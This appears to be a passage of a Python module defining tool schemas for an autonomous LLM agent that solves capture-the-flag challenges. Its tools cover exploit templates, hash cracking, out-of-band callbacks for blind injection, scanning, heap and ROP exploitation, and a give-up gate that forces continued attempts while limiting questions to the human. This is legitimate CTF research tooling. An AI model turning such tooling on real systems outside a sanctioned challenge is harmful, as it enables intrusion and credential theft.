"""
Tool implementations for the autonomous CTF agent.
Each function maps to a tool the LLM can call.

New tools (v2):
  - think         : externalise chain-of-thought; recorded to session memory
  - update_memory : write a key/value to the agent's persistent scratchpad
Finish gate: agent may only declare NOT_FOUND after ≥5 distinct failures.
"""

import subprocess
import threading
from pathlib import Path

from ctf_rag.retriever import retrieve, retrieve_multi

# ---------------------------------------------------------------------------
# Background shell registry — persists across tool calls within one session
# ---------------------------------------------------------------------------
# Maps shell_id (str) → {"proc": Popen, "stdout_buf": list[str], "thread": Thread}
_BG_SHELLS: dict = {}

# Minimum number of distinct failures before the agent may give up
MIN_FAILURES_BEFORE_GIVING_UP = 5

# Grace: after this many script-fix retries, start counting toward note_failure
SCRIPT_FIX_GRACE = 3

# ---------------------------------------------------------------------------
# Tool schemas — defined once, converted per-backend in autonomous.py
# ---------------------------------------------------------------------------

TOOL_SCHEMAS = [
    {
        "name": "think",
        "description": (
            "REQUIRED after every note_failure and before trying a new approach. "
            "Write out your full reasoning: what do you know, what haven't you tried, "
            "what does the math/recon suggest? This is recorded to your working memory "
            "and helps you stay on track across many iterations."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "reasoning": {
                    "type": "string",
                    "description": "Your full chain-of-thought reasoning",
                },
            },
            "required": ["reasoning"],
        },
    },
    {
        "name": "save_state",
        "description": "Save the current memory, thought, and failure states to a checkpoint. Use this before trying a risky or uncertain branch.",
        "parameters": {
            "type": "object",
            "properties": {
                "checkpoint_name": {"type": "string", "description": "Name for this checkpoint state"}
            },
            "required": ["checkpoint_name"]
        }
    },
    {
        "name": "revert_state",
        "description": "Revert the agent memory, thought, and failure state to a previously saved checkpoint.",
        "parameters": {
            "type": "object",
            "properties": {
                "checkpoint_name": {"type": "string", "description": "Name of the checkpoint to restore"}
            },
            "required": ["checkpoint_name"]
        }
    },
    {
        "name": "update_memory",
        "description": (
            "Write a key/value pair to your persistent working memory scratchpad. "
            "Use this to record: detected category, current hypothesis, flag format, "
            "values extracted from challenge files, partial progress, etc. "
            "This is injected into your system prompt every iteration so you never forget."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "key": {"type": "string", "description": "Memory key (e.g. 'category', 'hypothesis', 'n_value')"},
                "value": {"type": "string", "description": "Value to store"},
            },
            "required": ["key", "value"],
        },
    },
    {
        "name": "search_writeups",
        "description": (
            "Search the CTF writeup knowledge base for challenges similar to what you're seeing. "
            "Call this AFTER doing initial recon so your query is specific (e.g. '64-bit ELF NX PIE "
            "format string printf' not just 'binary challenge')."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Specific technical query based on what recon revealed"},
                "category": {
                    "type": "string",
                    "enum": ["web", "crypto", "pwn", "rev", "forensics", "misc"],
                    "description": "Restrict to this category (optional but recommended)",
                },
                "top_k": {"type": "integer", "description": "Results to return (default 3)"},
                "exclude_terms": {"type": "string", "description": "Ignore writeups containing these words (e.g. 'sqlmap' if you already tried that and it failed)"},
            },
            "required": ["query"],
        },
    },
    {
        "name": "get_attack_tree",
        "description": (
            "Get an ordered checklist of techniques to try for a CTF category. "
            "Use this when RAG finds nothing relevant or you need a systematic fallback plan. "
            "You MUST call this before calling finish(NOT_FOUND)."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "category": {
                    "type": "string",
                    "enum": ["web", "crypto", "pwn", "rev", "forensics", "misc"],
                },
            },
            "required": ["category"],
        },
    },
    {
        "name": "get_template",
        "description": (
            "Get a working exploit template/skeleton for a specific attack type. "
            "Returns ready-to-run Python/bash code you can write_file and execute immediately."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "template": {
                    "type": "string",
                    "enum": [
                        "pwn_ret2libc",
                        "pwn_format_string",
                        "pwn_format_string_advanced",
                        "pwn_rop_libc",
                        "pwn_srop",
                        "pwn_ret2csu",
                        "pwn_heap_tcache",
                        "pwn_io_file",
                        "pwn_kernel_rop",
                        "pwn_race_condition",
                        "crypto_rsa",
                        "crypto_franklin_reiter",
                        "crypto_rsa_advanced",
                        "crypto_z3",
                        "crypto_ecc",
                        "web_jwt_forge",
                        "web_sqli",
                        "rev_angr",
                        "rev_brute_numeric",
                        "forensics_recon",
                        "forensics_multitool",
                    ],
                    "description": "Which template to retrieve",
                },
            },
            "required": ["template"],
        },
    },
    {
        "name": "note_failure",
        "description": (
            "Record an approach that FAILED so you never repeat it. "
            "Call this the moment you confirm an approach doesn't work — "
            "i.e. the script ran successfully (exit 0) but produced no useful output. "
            "DO NOT call this if the script crashed ([SCRIPT FAILED]) — that's a code bug, "
            "not an attack failure. After calling note_failure, you MUST call think() next."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "method": {"type": "string", "description": "Technique or approach that failed"},
                "reason": {"type": "string", "description": "Why it failed"},
            },
            "required": ["method", "reason"],
        },
    },
    {
        "name": "shell_exec",
        "description": (
            "Execute a shell command and return stdout + stderr. "
            "Use for running exploits, nmap, curl, sqlmap, python scripts, pwntools, etc. "
            "⚠ EACH call runs in a FRESH independent bash shell — NO persistent cd between calls. "
            "⚠ ALWAYS use ABSOLUTE paths (e.g. /home/work/.../file) — relative paths fail silently "
            "if you changed directory in a previous call. The output always shows [CWD: /path] so "
            "you always know the base. When you discover a file, store its ABSOLUTE path in memory. "
            "If the output shows [SCRIPT FAILED — exit code N], your CODE has a bug — fix it. "
            "If exit 0 but no output, add print() statements to debug. "
            "Only call note_failure after a successful run that yields no flag. "
            "For interactive binaries (menus, prompts): use stdin_input to pipe answers, "
            "e.g. stdin_input='1\\n123456\\n3\\n' to select menu option 1, enter code, then exit. "
            "Never run an interactive binary without stdin_input — it will hang and timeout."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Shell command to run (bash -c)"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default 30, max 120)"},
                "stdin_input": {"type": "string", "description": "Optional data to pipe to the process stdin (use \\n for newlines). Required for interactive binaries that show menus or prompts."},
            },
            "required": ["command"],
        },
    },
    {
        "name": "bg_shell",
        "description": (
            "Manage a BACKGROUND shell — lets you run long-lived processes (servers, listeners, "
            "qemu, netcat) in one shell while doing analysis in another. "
            "Three actions:\n"
            "  action='start': spawn shell_id with command running in background. "
            "Returns immediately with the shell_id. Use for: starting a service before attacking it, "
            "running qemu-arm in background while reversing, launching a listener.\n"
            "  action='read': return buffered stdout/stderr collected so far from shell_id. "
            "Call repeatedly to poll for output.\n"
            "  action='kill': terminate shell_id and remove it.\n"
            "Example workflow:\n"
            "  bg_shell(action='start', shell_id='srv', command='python3 server.py')\n"
            "  shell_exec(command='curl http://localhost:5000/')\n"
            "  bg_shell(action='read', shell_id='srv')   ← see server logs\n"
            "  bg_shell(action='kill', shell_id='srv')"
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "action":   {"type": "string",  "description": "'start', 'read', or 'kill'"},
                "shell_id": {"type": "string",  "description": "Unique name for this shell (e.g. 'srv', 'listener', 'qemu')"},
                "command":  {"type": "string",  "description": "Command to run (required for action='start')"},
                "timeout":  {"type": "integer", "description": "For action='read': seconds to wait for new output (default 2)"},
                "stdin_input": {"type": "string", "description": "Data to write to stdin after start (optional)"},
            },
            "required": ["action", "shell_id"],
        },
    },
    {
        "name": "read_file",
        "description": "Read a file's contents. For binary files, returns a hex dump of the first 512 bytes.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "File path to read"},
                "binary": {"type": "boolean", "description": "Hex dump mode for binary files (default false)"},
            },
            "required": ["path"],
        },
    },
    {
        "name": "write_file",
        "description": "Write content to a file (creates parent dirs). Use to save exploit scripts, then run them with shell_exec.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "content": {"type": "string"},
            },
            "required": ["path", "content"],
        },
    },
    {
        "name": "r2_analyze",
        "description": (
            "Run a radare2 command on a binary file and return the output. "
            "Great for: listing functions (afl), disassembling main (pdf @ main), "
            "finding strings (izz), checking imports (ii), info (iI). "
            "Use for initial binary recon in pwn/rev challenges."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "binary": {"type": "string", "description": "Path to the binary file"},
                "command": {"type": "string", "description": "r2 command(s) separated by semicolons, e.g. 'aaa;afl'"},
            },
            "required": ["binary", "command"],
        },
    },
    {
        "name": "z3_solve",
        "description": (
            "Run a Python snippet that uses z3-solver to solve constraints. "
            "Provide complete Python code (including 'from z3 import *', Solver setup, "
            "add(), check(), and print). Returns the solver output. "
            "Use for custom hash/check reversal, license key cracking, crypto constraint solving."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "code": {"type": "string", "description": "Complete z3 Python snippet to execute"},
            },
            "required": ["code"],
        },
    },
    {
        "name": "gmpy2_compute",
        "description": (
            "Run a Python snippet using gmpy2 for fast big-integer arithmetic. "
            "Use for: iroot (exact nth roots), powmod, invert, gcd, is_prime, "
            "factor_trial_division, miller_rabin. Much faster than pure Python for large numbers."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "code": {"type": "string", "description": "Complete Python snippet using gmpy2"},
            },
            "required": ["code"],
        },
    },
    {
        "name": "crack_hash",
        "description": (
            "Crack a hash using hashcat with rockyou.txt wordlist. "
            "Supports: md5, sha1, sha256, sha512, bcrypt, ntlm, and more. "
            "Provide the hash string and the hash-type name."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "hash_value": {"type": "string", "description": "The hash to crack"},
                "hash_type": {
                    "type": "string",
                    "enum": ["md5", "sha1", "sha256", "sha512", "bcrypt", "ntlm", "lm", "md5crypt"],
                    "description": "Hash algorithm name"
                },
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/rockyou.txt)"},
            },
            "required": ["hash_value", "hash_type"],
        },
    },
    {
        "name": "web_request",
        "description": (
            "Make an HTTP request and return status + response body. "
            "Use for: testing endpoints, sending payloads, checking responses, "
            "following redirects. Supports GET/POST with custom headers and cookies."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL"},
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE", "PATCH"], "description": "HTTP method"},
                "data": {"type": "object", "description": "POST body data as key-value dict"},
                "headers": {"type": "object", "description": "Request headers as key-value dict"},
                "cookies": {"type": "object", "description": "Cookies as key-value dict"},
                "params": {"type": "object", "description": "URL query parameters as key-value dict"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "ffuf_fuzz",
        "description": (
            "Run ffuf web fuzzer to discover endpoints, files, or parameters. "
            "Use FUZZ as the fuzzing placeholder in the URL or data. "
            "Returns discovered paths/files that return interesting status codes."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL with FUZZ placeholder (e.g. http://target/FUZZ)"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
                "extensions": {"type": "string", "description": "File extensions to try (e.g. 'php,txt,html')"},
                "filter_code": {"type": "string", "description": "Filter OUT these status codes (e.g. '404,403')"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "finish",
        "description": (
            "End the agent loop and submit the final answer. "
            "Call when you have the flag. "
            "If calling with flag=NOT_FOUND, you MUST have already: "
            "(1) tried at least 5 distinct approaches (note_failure called 5+ times), "
            "(2) called get_attack_tree, and "
            "(3) called think at least once. "
            "Otherwise this call will be REJECTED and you must keep trying."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "report": {"type": "string", "description": "Full markdown attack report"},
                "flag": {"type": "string", "description": "Captured flag or 'NOT_FOUND'"},
            },
            "required": ["report", "flag"],
        },
    },
    {
        "name": "browser_exec",
        "description": "Launch headless browser to eval JS on a URL and return DOM + result.",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}, "js_script": {"type": "string"}}, "required": ["url", "js_script"]}
    },
    {
        "name": "allocate_oast_payload",
        "description": "Allocate a unique out-of-band domain (interactsh) for blind injection (XSS/SSRF/SQLi/RCE). Returns a payload URL and session ID.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "check_oast_logs",
        "description": "Check if any system hit your OAST payload URL.",
        "parameters": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string", "description": "The timestamp string returned by allocate_oast_payload"},
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "pcap_analyze_flows",
        "description": "Parse a PCAP file and extract HTTP requests, DNS queries, and TCP streams into a clean JSON digest. Automatically skips noise and extracts credentials/flags.",
        "parameters": {
            "type": "object",
            "properties": {
                "pcap_path": {"type": "string", "description": "Path to the PCAP file to analyze"},
                "filter": {"type": "string", "description": "Optional BPF filter (e.g., 'tcp' to focus on TCP streams)"}
            },
            "required": ["pcap_path"]
        }
    }
]

TOOL_SCHEMAS.append({
    "name": "decompile_function",
    "description": "Decompile an ELF binary function into C pseudo-code using r2ghidra.",
    "parameters": {"type": "object", "properties": {"binary": {"type": "string"}, "func_name": {"type": "string"}}, "required": ["binary", "func_name"]}
})

TOOL_SCHEMAS.append({
    "name": "gdb_analyze",
    "description": (
        "Quick GDB crash analysis: run a binary with a payload and return registers + backtrace on crash. "
        "For simple offset finding only. "
        "For anything more complex (breakpoints, memory inspection, step-through), use gdb_script instead. "
        "For ARM binaries use angr_solve(arch='ARM') or qemu_gdb."
    ),
    "parameters": {"type": "object", "properties": {"binary": {"type": "string"}, "payload": {"type": "string"}}, "required": ["binary", "payload"]}
})

TOOL_SCHEMAS.append({
    "name": "find_gadget",
    "description": "Search an ELF binary for ROP gadgets matching a python regex query (e.g. 'pop rdi; ret') using ropper.",
    "parameters": {"type": "object", "properties": {"binary": {"type": "string"}, "regex": {"type": "string"}}, "required": ["binary", "regex"]}
})

TOOL_SCHEMAS.append({
    "name": "unicorn_emulate",
    "description": (
        "Emulate an ARM or x86/x86_64 function in isolation using the Unicorn CPU emulator — "
        "no OS required, no qemu-system. Ideal for: reversing hash/PRNG functions in ARM crackmes, "
        "testing what a function returns for a given input without running the full binary. "
        "Extracts function bytes at func_addr, sets up registers, runs up to max_insn instructions, "
        "returns all register values at the end. "
        "arch options: 'arm', 'arm_thumb', 'x86', 'x86_64'. "
        "regs: dict mapping register names to initial values (e.g. {'r0': 1234, 'r1': 0}). "
        "Use this when: (1) you have the function address from r2/ghidra, "
        "(2) the function is self-contained (no heavy syscalls), "
        "(3) you want to test many inputs quickly (call in a Python loop via shell_exec)."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary":    {"type": "string",  "description": "Path to the ELF binary"},
            "func_addr": {"type": "string",  "description": "Hex address of the function to emulate (e.g. '0x10408')"},
            "func_size": {"type": "integer", "description": "Max bytes to map from func_addr (default 512)"},
            "arch":      {"type": "string",  "description": "'arm', 'arm_thumb', 'x86', 'x86_64' (default: auto-detected from ELF)"},
            "regs":      {"type": "object",  "description": "Initial register values: {'r0': 42, 'r1': 0} for ARM or {'rdi': 42} for x86_64"},
            "max_insn":  {"type": "integer", "description": "Maximum instructions to execute (default 500)"},
            "stack_data":{"type": "string",  "description": "Hex string to preload at SP (e.g. 'deadbeef00000000') for functions that read from stack"},
        },
        "required": ["binary", "func_addr"],
    },
})

TOOL_SCHEMAS.append({
    "name": "qemu_gdb",
    "description": (
        "Dynamic ARM/MIPS analysis via qemu-user tracing. "
        "Since gdb-multiarch is not installed, this uses qemu's built-in tracing instead of GDB breakpoints. "
        "gdb_cmds is a list of trace modes to enable: "
        "'strace' — trace all syscalls with arguments/return values (most useful for crackmes: see read/write/open calls); "
        "'asm' — log every executed ARM instruction to a file (very verbose, use with small inputs); "
        "'cpu' — log CPU state changes. "
        "Examples: "
        "  qemu_gdb(binary='./vault_app', gdb_cmds=['strace'], stdin_input='2\\n000000\\n', rootfs='/path/to/rootfs') "
        "  → shows which bytes are read, what comparisons happen via syscall args. "
        "  qemu_gdb(binary='./vault_app', gdb_cmds=['asm'], stdin_input='\\n') "
        "  → shows the last 100 ARM instructions executed. "
        "For breakpoint-style debugging, use unicorn_emulate instead."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary":     {"type": "string", "description": "Path to the ELF binary"},
            "gdb_cmds":   {"type": "array",  "items": {"type": "string"},
                           "description": "Trace modes: ['strace'], ['asm'], ['strace','asm'], or ['cpu']"},
            "rootfs":     {"type": "string", "description": "Sysroot for qemu-arm -L (omit for static binaries)"},
            "stdin_input":{"type": "string", "description": "Input to feed to the binary's stdin"},
            "arch_qemu":  {"type": "string", "description": "'arm', 'aarch64', 'mips', 'mipsel' (default: 'arm')"},
            "timeout":    {"type": "integer","description": "Seconds before killing (default 30)"},
        },
        "required": ["binary", "gdb_cmds"],
    },
})

TOOL_SCHEMAS.append({
    "name": "angr_solve",
    "description": (
        "Symbolic execution via angr to find the input that reaches the success path. "
        "Works on x86, x86_64, ARM, MIPS binaries. "
        "Use find_str (preferred) when you know the success string in stdout (e.g. 'Correct'). "
        "Use find_addr when you have the success block address from Ghidra/r2. "
        "For ARM: set arch='ARM'. For large binaries with path explosion, use flag_length to limit. "
        "If angr times out: reduce flag_length, or use unicorn_emulate for function-level emulation. "
        "Check the Capabilities Manifest in Working Memory for availability status."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary":     {"type": "string", "description": "Path to the ELF binary"},
            "find_str":   {"type": "string", "description": "Success string in stdout (e.g. 'Correct') — use instead of find_addr"},
            "avoid_str":  {"type": "string", "description": "Failure string in stdout (e.g. 'Wrong') — use instead of avoid_addr"},
            "find_addr":  {"type": "string", "description": "Hex address of success block (e.g. '0x401234') — use if find_str unavailable"},
            "avoid_addr": {"type": "string", "description": "Hex address of failure/exit block — use if avoid_str unavailable"},
            "flag_length":{"type": "integer","description": "Expected input length in bytes (default 40)"},
            "arch":       {"type": "string", "description": "Force architecture: 'ARM', 'MIPS', 'x86', 'AMD64' (auto-detected if omitted)"},
        },
        "required": ["binary"],
    },
})

TOOL_SCHEMAS.append({
    "name": "ask_human",
    "description": (
        "Ask the human user for a hint or manual action that ONLY A HUMAN can do "
        "(e.g., physical access to hardware, reading a flag from a machine you cannot reach, "
        "supplying VPN credentials). "
        "NEVER use this to ask about approach, strategy, or 'should I try X' — decide yourself. "
        "NEVER use this to ask the user to run commands for you — YOU run the commands. "
        "ONLY call this after ≥5 distinct note_failure() calls AND after get_attack_tree() AND think()."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "question": {"type": "string", "description": "The specific human-only action or information needed"},
        },
        "required": ["question"],
    },
})

TOOL_SCHEMAS.append({
    "name": "delegate_task",
    "description": (
        "Spawn a focused sub-agent (Haiku model) to explore one attack path in parallel. "
        "Use this to: run background fuzzing while you analyse the binary, enumerate web endpoints "
        "while decoding tokens, crack a hash while solving another step, or get a second opinion "
        "on a hypothesis. The sub-agent runs up to 10 tool calls and reports its findings back. "
        "Example: delegate_task(task='Find the buffer overflow offset in ./vuln using cyclic pattern', "
        "category='pwn', tools_hint='gdb_analyze, shell_exec')"
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "task": {"type": "string", "description": "Precise subtask description for the sub-agent"},
            "category": {"type": "string", "description": "CTF category hint (crypto/pwn/web/rev/forensics/misc)"},
            "tools_hint": {"type": "string", "description": "Comma-separated list of tools the sub-agent should focus on"},
        },
        "required": ["task"],
    },
})

TOOL_SCHEMAS.append({
    "name": "run_afl",
    "description": (
        "Run AFL++ fuzzer on a binary for a bounded time window to discover crashes. "
        "Returns crash-triggering payloads (stdin or file) ready to use in GDB or pwntools. "
        "Use for pwn/rev challenges where the vulnerability type is unknown. "
        "Requires AFL++ to be installed; falls back to Python-based mutation fuzzing if not."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary": {"type": "string", "description": "Path to the target ELF binary"},
            "timeout_minutes": {"type": "integer", "description": "Fuzzing time limit in minutes (default 3, max 10)"},
            "input_mode": {
                "type": "string",
                "enum": ["stdin", "file"],
                "description": "How the binary reads input: 'stdin' (default) or 'file' (uses @@ in AFL)"
            },
            "seed": {"type": "string", "description": "Initial seed string for fuzzing (default: 'AAAAAAA')"},
        },
        "required": ["binary"],
    },
})

TOOL_SCHEMAS.append({
    "name": "nmap_scan",
    "description": (
        "Run nmap against a host/port with service and version detection. "
        "Returns open ports, running services, banners, and OS guess. "
        "Use for network challenges, or when nc target analysis is needed."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "Host or IP to scan (e.g. 'chall.ctf.io' or '10.0.0.1')"},
            "ports": {"type": "string", "description": "Port(s) or range: '1337', '80,443', '1-1000' (default: top 100)"},
            "flags": {"type": "string", "description": "Extra nmap flags (e.g. '-sU' for UDP, '-A' for aggressive)"},
        },
        "required": ["target"],
    },
})

TOOL_SCHEMAS.append({
    "name": "ghidra_analyze",
    "description": (
        "Decompile an entire binary using Ghidra headless and return C pseudo-code for key functions. "
        "More accurate than r2ghidra for complex binaries. Use for rev/pwn challenges with custom VMs, "
        "packed binaries, or obfuscated control flow. Falls back to r2ghidra if Ghidra is unavailable."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary": {"type": "string", "description": "Path to the binary to decompile"},
            "function": {"type": "string", "description": "Function name to focus on (default: 'main'). Use 'all' for top 10 functions."},
        },
        "required": ["binary"],
    },
})

TOOL_SCHEMAS.append({
    "name": "find_xrefs",
    "description": (
        "Find all cross-references (callers, data refs) to a symbol or address in a binary. "
        "Use to answer: 'what calls check_password()?', 'where is this string used?', "
        "'which functions reference this global?'. "
        "symbol can be a function name (e.g. 'sym.verify') or hex address (e.g. '0x401234'). "
        "Returns caller address, calling function, and instruction for each xref. "
        "Much cheaper than dumping entire decompilation — use this FIRST to map call graph."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary": {"type": "string", "description": "Path to the ELF binary"},
            "symbol": {"type": "string", "description": "Function name, symbol (e.g. 'sym.check'), or hex address (e.g. '0x401234')"},
        },
        "required": ["binary", "symbol"],
    },
})

TOOL_SCHEMAS.append({
    "name": "get_function_cfg",
    "description": (
        "Get the Control Flow Graph (CFG) of a function as ASCII art. "
        "Shows all basic blocks, conditional branches, and loop structure without dumping full assembly. "
        "Use to understand: loop conditions, if/else chains, state machine transitions. "
        "func_name can be 'main', 'sym.verify_key', or a hex address like '0x401234'. "
        "For large functions, set max_blocks to limit output (default 40 blocks)."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary":    {"type": "string",  "description": "Path to the ELF binary"},
            "func_name": {"type": "string",  "description": "Function name or hex address"},
            "max_blocks":{"type": "integer", "description": "Max basic blocks to show (default 40, set lower for huge functions)"},
        },
        "required": ["binary", "func_name"],
    },
})

TOOL_SCHEMAS.append({
    "name": "gdb_script",
    "description": (
        "Run an arbitrary sequence of GDB commands against a binary in a single batch session. "
        "Replaces gdb_analyze for any non-trivial debugging: set breakpoints, examine memory, "
        "inspect registers mid-execution, call functions, patch bytes, and continue — all in one shot. "
        "gdb_commands is a list of GDB command strings executed in order. "
        "The session captures all GDB output and returns it. "
        "Examples:\n"
        "  # Catch crash and inspect stack\n"
        "  gdb_script(binary='./chall', stdin_input='A'*200,\n"
        "    gdb_commands=['run', 'info registers', 'x/20gx $rsp', 'backtrace'])\n"
        "  # Breakpoint at specific address, inspect state\n"
        "  gdb_script(binary='./chall', args=['solve'],\n"
        "    gdb_commands=['break *0x401234', 'run', 'info registers', 'x/s $rdi', 'continue'])\n"
        "  # Find offset by catching SIGSEGV\n"
        "  gdb_script(binary='./chall', stdin_input='AAAABBBBCCCCDDDD',\n"
        "    gdb_commands=['run', 'p/x $rip', 'p/x $rbp'])"
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary":       {"type": "string",  "description": "Path to the ELF binary"},
            "gdb_commands": {"type": "array",   "items": {"type": "string"},
                             "description": "GDB commands to run in order (e.g. ['break main', 'run', 'info registers'])"},
            "stdin_input":  {"type": "string",  "description": "Data to feed to the binary's stdin (sent before GDB prompt)"},
            "args":         {"type": "array",   "items": {"type": "string"},
                             "description": "Command-line arguments for the binary (e.g. ['--flag', 'input.txt'])"},
            "timeout":      {"type": "integer", "description": "Seconds before killing GDB (default 30)"},
        },
        "required": ["binary", "gdb_commands"],
    },
})

TOOL_SCHEMAS.append({
    "name": "one_gadget",
    "description": (
        "Find one-gadget RCE addresses in a libc binary — single gadgets that call execve('/bin/sh'). "
        "Much simpler than full ROP chains. Use after leaking libc base address in pwn challenges."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "libc_path": {"type": "string", "description": "Path to the libc.so.6 file (or 'auto' to find system libc)"},
        },
        "required": ["libc_path"],
    },
})

TOOL_SCHEMAS.append({
    "name": "cyclic_offset",
    "description": (
        "Find the exact offset to RIP/EIP/saved-return-address in a buffer overflow using pwntools cyclic pattern. "
        "Automatically runs the binary with a cyclic pattern, catches the crash, and returns the exact offset. "
        "Use at the START of every pwn challenge to find the overflow offset."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary": {"type": "string", "description": "Path to the vulnerable ELF binary"},
            "max_length": {"type": "integer", "description": "Max cyclic pattern length (default: 300)"},
            "arch": {"type": "string", "enum": ["amd64", "i386"], "description": "Architecture (default: amd64)"},
        },
        "required": ["binary"],
    },
})

TOOL_SCHEMAS.append({
    "name": "ltrace_run",
    "description": (
        "Run a binary under ltrace to intercept library calls (strcmp, strncmp, memcmp, printf, etc). "
        "Extremely useful for reversing challenges that compare input against a secret — the secret "
        "often appears in clear text in the strcmp call. Try this BEFORE angr for most crackmes."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary": {"type": "string", "description": "Path to the ELF binary"},
            "input": {"type": "string", "description": "Test input string to feed to the binary"},
        },
        "required": ["binary"],
    },
})

TOOL_SCHEMAS.append({
    "name": "crypto_identify",
    "description": (
        "Identify the type of a hash, ciphertext, or encoded string. "
        "Returns likely hash algorithms, encoding formats, or cipher types. "
        "Use at the start of any crypto/forensics challenge to classify the target data."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "data": {"type": "string", "description": "Hash/ciphertext/encoded string to identify"},
        },
        "required": ["data"],
    },
})

TOOL_SCHEMAS.append({
    "name": "web_search",
    "description": (
        "Query external knowledge sources for CTF-relevant information. "
        "Use domain-specific intents for best results:\n"
        "  factordb  — look up RSA modulus n in factordb.com (instant if n is known)\n"
        "  libc      — find libc version + function offsets from last 12 hex bits of a leaked address\n"
        "  crackstation — attempt to reverse an MD5/SHA1/SHA256 hash via online rainbow table\n"
        "  cve       — look up a CVE ID for exploit details\n"
        "  general   — DuckDuckGo search for tool docs, technique names, CTF hints\n"
        "Always prefer factordb/libc/crackstation over general for their respective tasks — "
        "they return structured data instead of prose."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "query": {
                "type": "string",
                "description": (
                    "The search query or lookup value. "
                    "For factordb: the integer n. "
                    "For libc: last-12-bits of a leaked address in hex (e.g. 'puts=0xd90'). "
                    "For crackstation: the hash string. "
                    "For cve: the CVE ID (e.g. 'CVE-2023-1234'). "
                    "For general: a natural language search string."
                ),
            },
            "intent": {
                "type": "string",
                "enum": ["factordb", "libc", "crackstation", "cve", "general"],
                "description": "Which backend to use (default: general)",
            },
        },
        "required": ["query"],
    },
})

TOOL_SCHEMAS.append({
    "name": "validate_flag",
    "description": (
        "Verify that a candidate flag string matches a known CTF platform format "
        "before submitting it via finish(). "
        "Returns OK if the format matches, or MISMATCH with a hint about what's wrong. "
        "Always call this before finish() when you have a flag candidate — it prevents "
        "wasting the run on a malformed or hallucinated flag."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "flag": {
                "type": "string",
                "description": "The candidate flag string to validate",
            },
            "platform": {
                "type": "string",
                "description": (
                    "Expected platform/event prefix if known: "
                    "'picoctf', 'htb', 'ctf', 'flag', 'thm', 'ictf', 'enset', or 'auto' "
                    "(auto-detects from flag content). Default: auto."
                ),
            },
        },
        "required": ["flag"],
    },
})

TOOL_SCHEMAS.append({
    "name": "reset_environment",
    "description": (
        "Restore challenge files to their original state (t=0 snapshot). "
        "Use this when the workspace has been corrupted by a bad exploit attempt: "
        "overwritten binary, bad chmod, heap/stack corruption from a native run, etc. "
        "After reset, all files in the workdir are restored to the snapshot taken "
        "at agent startup. Your working memory is preserved — only files are reset."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "confirm": {
                "type": "boolean",
                "description": "Must be true to confirm the reset (prevents accidental calls)",
            },
        },
        "required": ["confirm"],
    },
})

TOOL_SCHEMAS.append({
    "name": "heap_exploit",
    "description": (
        "Generate and run a heap exploitation script for a specific House-of-X technique. "
        "Handles: tcache_poison (glibc 2.27-2.31), botcake (double-free bypass 2.29+), "
        "tangerine (tcache_perthread 2.35+), io_file_fsop (no-hooks 2.34+), "
        "unsorted_bin (global_max_fast overwrite), largebin (bk_nextsize corruption). "
        "Returns a pwntools skeleton configured for the chosen technique."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary":    {"type": "string", "description": "Path to target binary"},
            "technique": {
                "type": "string",
                "enum": ["tcache_poison", "botcake", "tangerine", "io_file_fsop",
                         "unsorted_bin", "largebin", "house_of_force", "safe_link_bypass"],
                "description": "Which heap exploitation technique to generate",
            },
            "target_addr": {"type": "string", "description": "Target address to overwrite (hex, e.g. '0x404060' for GOT entry or '__free_hook')"},
            "libc_path":   {"type": "string", "description": "Path to libc.so.6 (optional, for one_gadget / offset lookup)"},
            "glibc_version": {"type": "string", "description": "Glibc version string e.g. '2.35', '2.31' (auto-detected if omitted)"},
        },
        "required": ["binary", "technique"],
    },
})

TOOL_SCHEMAS.append({
    "name": "rop_chain_synthesis",
    "description": (
        "Automatically synthesise a ROP chain for common goals using ROPgadget and pwntools. "
        "Supports goals: execve_binsh (system('/bin/sh') or execve chain), "
        "orw_flag (open+read+write for seccomp-restricted binaries), "
        "leak_got (puts(got_addr) for libc leak), "
        "mprotect_shellcode (mark region rwx then jump to shellcode). "
